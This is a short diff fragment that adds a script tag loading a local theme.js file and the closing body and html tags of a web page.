+    <script src="js/theme.js"></script>
+    </body>
+</html>
